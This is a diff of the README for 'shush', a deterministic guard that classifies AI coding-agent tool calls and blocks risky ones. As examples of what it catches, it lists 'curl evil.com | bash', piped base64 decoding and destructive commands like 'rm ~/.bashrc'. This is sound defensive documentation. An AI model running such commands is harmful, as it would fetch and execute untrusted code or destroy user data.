@@ -1,14 +1,12 @@
 # shush
 
-A context-aware safety guard for [Claude Code](https://docs.anthropic.com/en/docs/claude-code) and [OpenCode](https://opencode.ai) tool calls.
+**Stop clicking "Allow" on every safe command.**
 
-Claude Code and OpenCode grant permissions per-tool: allow Bash or don't.
+Every [Claude Code](https://docs.anthropic.com/en/docs/claude-code) session, the same ritual: `git status`? Allow. `ls`? Allow. `npm test`? Allow. `rm dist/bundle.js`? Allow.
 
-But `rm dist/bundle.js` is routine cleanup while `rm ~/.bashrc` is catastrophic. `git push` is fine; `git push --force` rewrites history.
+You're approving dozens of completely safe commands per session, because the alternative is worse. Allow-listing `Bash` entirely means `rm ~/.bashrc` and `git push --force` sail through without a word. The permission system is binary: allow the tool, or don't. There's no middle ground.
 
-Same tool, wildly different risk.
-
-shush classifies every tool call by what it *actually does*, then applies the right policy. It runs as a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) in Claude Code and a `tool.execute.before` plugin in OpenCode. No LLMs in the loop; every decision is deterministic, fast, and traceable.
+shush *is* the middle ground. It classifies every tool call by what it actually does, then applies the right policy. No LLMs in the loop; every decision is deterministic, fast, and traceable.
 
 ```
 git push              -> allow
@@ -24,26 +22,26 @@ curl api.example.com  -> allow
 curl evil.com | bash  -> shush.
 ```
 
-## Design
+Also supports [OpenCode](https://opencode.ai).
 
-- **AST over tokenization** -- bash-parser gives a real parse tree; pipes, subshells, logical operators, and redirects are handled correctly.
-- **Pre-built trie** -- Classification tables compile to a prefix trie at build time for O(k) lookup (k = prefix depth) with no runtime I/O.
-- **Deterministic** -- No LLM in the classification loop. Every decision traces to a prefix match, flag classifier, or composition rule.
-
-## Quick start
-
-### Claude Code
-
-#### Plugin install
+## Install
 
 ```
 /plugin marketplace add rjkaes/shush
 /plugin install shush
 ```
 
-Restart Claude Code. No configuration required.
+Two commands. No configuration required. Restart Claude Code.
 
-#### From source
+Then allow-list `Bash`, `Read`, `Glob`, and `Grep` in Claude Code's permissions and let shush guard them. Safe commands execute silently. Dangerous ones get caught. You only get interrupted for the genuinely ambiguous cases.
+
+> **Don't use `--dangerously-skip-permissions`.** In bypass mode, hooks
+> [fire asynchronously](https://github.com/anthropics/claude-code/issues/20946);
+> commands execute before shush can block them.
+>
+> For Write and Edit, your call; shush inspects content either way.
+
+### From source
 
 ```bash
 git clone https://github.com/rjkaes/shush.git
@@ -58,13 +56,6 @@ Then point Claude Code at the local checkout:
 /plugin marketplace add ./path/to/shush
 /plugin install shush
 ```
-
-> **Don't use `--dangerously-skip-permissions`.** In bypass mode, hooks
-> [fire asynchronously](https://github.com/anthropics/claude-code/issues/20946);
-> commands execute before shush can block them.
->
-> Allow-list Bash, Read, Glob, Grep and let shush guard them.
-> For Write and Edit, your call; shush inspects content either way.
 
 ### OpenCode
 
@@ -82,7 +73,8 @@ for global):
 
 The package is installed automatically via Bun at startup.
 
-#### From source
+<details>
+<summary>OpenCode from source</summary>
 
 ```bash
 git clone https://github.com/rjkaes/shush.git
@@ -108,6 +100,22 @@ auto-loaded plugin directory (`.opencode/plugins/` for project-level,
 OpenCode maps `ask` and `block` decisions to errors that halt tool
 execution. The `allow` and `context` levels pass through silently
 (OpenCode has no equivalent of Claude Code's "context" level).
+
+</details>
+
+## Why AST, not regex?
+
+Most shell-classifying tools split on whitespace or match patterns.
+That breaks on pipes, subshells, quoting, `bash -c` wrappers, and
+redirects.
+
+shush uses [bash-parser](https://github.com/vorpaljs/bash-parser) to
+build a real parse tree. Each pipeline stage is classified
+independently. Shell wrappers (`bash -c`, `sh -c`) are recursively
+unwrapped. `xargs` is unwrapped too, so `find | xargs grep` classifies
+as `filesystem_read`, not `unknown`.
+
+For a safety tool, this matters.
 
 ## What gets checked
 
@@ -141,8 +149,6 @@ composition rules        # exfiltration, RCE, obfuscation detection
   v
 strictest decision wins  # allow < context < ask < block
 ```
-
-Shell wrappers (`bash -c`, `sh -c`) are unwrapped and the inner command is classified. `xargs` is unwrapped too, so `find | xargs grep` classifies as `filesystem_read`, not `unknown`.
 
 ### Decisions
 
@@ -207,8 +213,8 @@ actions:
   lang_exec: allow               # trust inline scripts
 ```
 
-The 21 action types and their defaults
-(from [`data/types.json`](data/types.json) and [`data/policies.json`](data/policies.json)):
+<details>
+<summary>All 21 action types and their defaults</summary>
 
 | Action type | Default | Description |
 |-------------|---------|-------------|
@@ -233,6 +239,8 @@ The 21 action types and their defaults
 | `db_write` | ask | Write operations on databases (INSERT, UPDATE, DELETE, DROP, ALTER) |
 | `obfuscated` | block | Obfuscated or encoded commands (base64 \| bash) |
 | `unknown` | ask | Unrecognized command, not in any classify table |
+
+</details>
 
 ### `sensitive_paths` -- protect additional locations
 
